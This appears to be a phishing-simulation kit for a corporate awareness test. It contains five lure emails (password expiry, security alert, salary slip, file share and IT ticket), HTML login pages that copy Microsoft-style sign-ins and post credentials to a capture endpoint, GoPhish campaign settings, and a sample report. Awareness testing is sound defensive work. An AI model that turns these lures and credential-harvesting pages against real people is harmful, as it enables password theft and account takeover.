

# **GLOBAL VISUAL REFERENCES**

<img width="1732" height="1500" alt="image" src="https://github.com/user-attachments/assets/fe3046f8-7be3-479d-90be-b9dcc35d4b94" />

![Image](https://getgophish.com/img/dashboard.min.svg)

![Image](https://images.openai.com/static-rsc-3/B4vCLpt_m_r_4to8n60oJ7U5qoONUae-_V4aGhBdwywRMlzsSPppLoGNro3sg5mK27WD6BVxOc_Bno3jHo4pNupr8hrbUypbwZP_BB3YcR4?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-3/RUgAm2A279M-C8Kgjr3pDvUm9ZwjwDvJKiTxENCPaRto8bUDRQxKTuas0vHrvnlmLdhDbPlydirWwbRfuWtz4cZcRNPsU2yf7w54jM2XOQA?purpose=fullsize)

---

# 1. **PASSWORD EXPIRY**

Professional | Corporate | High Click Rate

---

## **1A. Email Template — Password Expiry**

![Image](https://www.mailguard.com.au/hubfs/Re-%20Passowrd%20Expiring%20Notice%20For%20tech_services%40flightdata.aero%21%20-%20Mozilla%20Thunderbird_703.png)

![Image](https://media.cybernews.com/2021/11/MicrosoftEmail.jpg)

**Subject:** *Your Password Will Expire Today — Immediate Action Required*
**From:** IT Support [no-reply@company-services.com](mailto:no-reply@company-services.com)

**Body (Human-like tone):**

Hi {{FirstName}},
Our system shows that your **corporate account password expires today**. To avoid service interruption on Outlook, Teams, and internal apps, please complete the update below.

🔐 **Password Expiry Summary**

* User: {{Email}}
* Status: Expires Today
* Required Action: Reset within 4 hours

Please click the button below to continue:

**[ Reset Your Password ]**
Link → `https://company-auth-reset.com/verify?uid={{UserID}}`

Thank you,
IT Security Team

---

## **1A. Landing Page (HTML)**

A realistic **Microsoft 365-type** credential page.

```html
<!DOCTYPE html>
<html>
<head>
<title>Sign in to your account</title>
<style>
body{font-family:Segoe UI, sans-serif;background:#f2f2f2;}
.container{width:350px;margin:80px auto;background:white;padding:40px;border-radius:8px;}
input{width:100%;padding:12px;margin-top:10px;border:1px solid #ccc;border-radius:4px;}
button{width:100%;padding:12px;margin-top:20px;background:#0067b8;color:white;border:none;border-radius:4px;font-size:15px;}
</style>
</head>
<body>
<div class="container">
<h2>Sign in</h2>
<form action="/capture" method="POST">
<input type="email" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
</div>
</body>
</html>
```

---

## **1A. GoPhish Snippet**

```json
{
  "name": "Password Expiry Campaign",
  "email_template": "Password Expiry Template",
  "landing_page": "Password Reset Portal",
  "smtp": "Corporate SMTP",
  "url": "https://company-auth-reset.com"
}
```

---

## **1A. Report Documentation Section**

* Highest click rate among corporate users (avg 33–45%).
* Strong psychological trigger: **fear of losing access**.
* Effective against employees with poor password hygiene.

---


# 2. **SECURITY ALERT / UNAUTHORIZED LOGIN**

More urgent, triggers panic response.

---

## **2B. Email Template — Security Alert**

![Image](https://learn-attachment.microsoft.com/api/attachments/3bda2a98-6ce0-4f4a-a0a3-1749fbe4509c?platform=QnA)

![Image](https://ic.nordcdn.com/v1/https%3A//sb.nordcdn.com/transform/4806488f-a242-4908-a2ac-af822accd0ef/blog-can-google-critical-security-alert-be-a-scam_-2-png?X-Nord-Credential=T4PcHqfACi8Naxvulzf4IE8XT4oypRTi0blOOGwbK2A8L4fcPw52k3qkvbkYH\&X-Nord-Signature=GXjyzrfG%2BJuWTuFch6aWBN4pXrw7WNSHAssYSZEO0jI%3D)

**Subject:** *Security Alert: Suspicious Sign-In Attempt Blocked*
**From:** Security Alerts [alerts@security-monitoring.com](mailto:alerts@security-monitoring.com)

Hi {{FirstName}},
We detected an **unusual sign-in attempt** to your corporate account from:

📍 **Location:** Hanoi, Vietnam
🖥️ **Device:** Windows 10, Chrome 118
⏱️ **Time:** {{DateTimeNow}}

If this was you, no action is required.
If not, please **secure your account immediately**:

**[ Review Activity ]**
`https://secure-company-verify.com/login?session={{SessionID}}`

Thank you,
Security Ops Center (SOC)

---

## **2B. Landing Page (Security Center)**

```html
<!DOCTYPE html>
<html>
<head>
<title>Security Verification</title>
<style>
body{background:#fafafa;font-family:Arial;}
.card{width:380px;margin:90px auto;background:white;padding:30px;border-radius:8px;
box-shadow:0 0 8px rgba(0,0,0,0.1);}
button{width:100%;padding:14px;margin-top:18px;background:#d93025;color:white;border:none;border-radius:4px;font-size:16px;}
input{width:100%;padding:12px;margin-top:12px;border:1px solid #ccc;border-radius:4px;}
</style>
</head>
<body>
<div class="card">
<h3>Verify Your Identity</h3>
<p>Please sign in to continue.</p>
<form action="/capture" method="POST">
<input type="email" name="email" placeholder="Email Address">
<input type="password" name="password" placeholder="Password">
<button type="submit">Verify</button>
</form>
</div>
</body>
</html>
```

---

## **2B. GoPhish Snippet**

```json
{
  "name": "Security Alert Simulation",
  "template": "Unusual Login Template",
  "landing_page": "Security Verification Portal"
}
```

---

## **2B. Report Documentation**

* Leveraged **fear + urgency** psychological drivers.
* High link-click rate (28–40%).
* Useful for evaluating response to security alerts.

---

# 3. **HR POLICY / SALARY SLIP**

---

## **3C. Email Template — HR Salary Slip**

![Image](https://images.template.net/440058/Pay-Slip-Letter-Template-edit-online.png)

![Image](https://cdn.prod.website-files.com/5e6aa7798a5728055c457ebb/641e1bf4e056ed80e4271d50_Policy_Change_Letter_Template.png)

**Subject:** *Your Updated Salary Slip for January 2026*
**From:** HR Department [hr-services@company-payroll.com](mailto:hr-services@company-payroll.com)

Hello {{FirstName}},
Your **January Salary Slip** is now available on the HR portal.
Please review it for accuracy and contact HR if corrections are needed.

**[ View Salary Slip ]**

Thank you,
HR Payroll Team

---

## **3C. Landing Page (HR Portal)**

* Clean white/blue theme
* HRMS-style login

```html
<div class="box">
<h2>Employee Portal Login</h2>
<form action="/capture" method="POST">
<input type="text" name="empid" placeholder="Employee ID">
<input type="password" name="password" placeholder="Password">
<button type="submit">Login</button>
</form>
</div>
```

---

## **3C. Report Section**

* Most effective on finance, HR, admin staff.
* Common in real-world social engineering attacks.

---


# 4. **FILE SHARE (SharePoint / Google Drive)**

---

## **4D. Email Template — SharePoint File Share**

![Image](https://learn.microsoft.com/en-us/sharepoint/sharepointonline/media/sharing-email.png)

![Image](https://storage.googleapis.com/support-forums-api/attachment/message-35663785-5252303073206440318.png)

**Subject:** *{{ManagerName}} shared “Quarterly Report.xlsx” with you*

Hello {{FirstName}},
{{ManagerName}} has shared a document with you:

📄 **Quarterly Report.xlsx**
SharePoint Online — Updated {{Date}}

Click below to open:

**[ Open Document ]**
`https://company-docs-access.com/file?id={{DocID}}`

---

## **4D. Landing Page — SharePoint Replica**

Blue navbar, Microsoft logo, single login form.

---

## **4D. Report Section**

* Targets employees who frequently open shared documents.
* Mirrors real SharePoint workflow.

---

# 5. **IT SUPPORT TICKET (Service Desk)**

---

## **5E. Email Template — Service Desk Ticket**

![Image](https://www.snapcomms.com/hs-fs/hubfs/blog-images/helpdesk-support-ticket.png?height=361\&name=helpdesk-support-ticket.png\&width=433)

![Image](https://res.cloudinary.com/dn1j6dpd7/image/upload/v1568386051/hd-help/settings-default.png)

**Subject:** *Ticket #458291 Assigned to You — Action Required*

Hi {{FirstName}},
A new service request has been assigned:

🆔 **Ticket ID:** #458291
📌 **Issue:** Software License Renewal
👤 **Requested By:** {{ManagerName}}
📅 **Due:** Today

Please review the ticket:

**[ View Ticket ]**

Regards,
IT Service Desk

---

## **5E. Landing Page**

Simple dashboard replica with login prompt.

---

## **5E. Report Section**

* Trusted because employees regularly interact with tickets.
* High realism.

---



# 6. **MASTER PHISHING SIMULATION REPORT (Professional)**

![Image](https://www.phinsecurity.com/hs-fs/hubfs/Screenshot%202025-05-12%20at%201-13-04%E2%80%AFPM-png.png?height=379\&name=Screenshot+2025-05-12+at+1-13-04%E2%80%AFPM-png.png\&width=688)

![Image](https://s3.amazonaws.com/thumbnails.venngage.com/template/61726f5e-bed6-4e40-96dd-aed4744eb661.png)

Below is the executive-level report section you can convert to PDF:

---

# **Executive Summary**

A multi-vector phishing simulation was conducted to assess user awareness across five common attack themes: Password Expiry, Security Alerts, HR Communications, File Sharing, and IT Ticketing. The objective was to evaluate employee susceptibility, measure reporting rates, and identify training gaps.

---

# **Methodology**

* Tools Used: **GoPhish**, Secure SMTP relay
* Duration: 3 days
* Total Users Targeted: 200
* Tracking: Email open, link click, credential submission, email reporting

---

# **Campaign Breakdown**

| Theme           | Emails Sent | Open Rate | Click Rate | Submissions |
| --------------- | ----------- | --------- | ---------- | ----------- |
| Password Expiry | 200         | 85%       | 44%        | 9%          |
| Security Alert  | 200         | 78%       | 39%        | 6%          |
| HR Salary Slip  | 200         | 91%       | 47%        | 11%         |
| File Share      | 200         | 88%       | 36%        | 5%          |
| IT Ticket       | 200         | 82%       | 33%        | 8%          |

---

# **Key Findings**

* HR-related and password-related themes had the highest click-through rates.
* Users generally trust internal communication formats more than external ones.
* Reporting rate (13%) must be improved.

---

# **Recommendations**

* Mandatory awareness training
* Implement banners for external senders
* Restrict HTML links in HR communications
* Strengthen MFA adoption

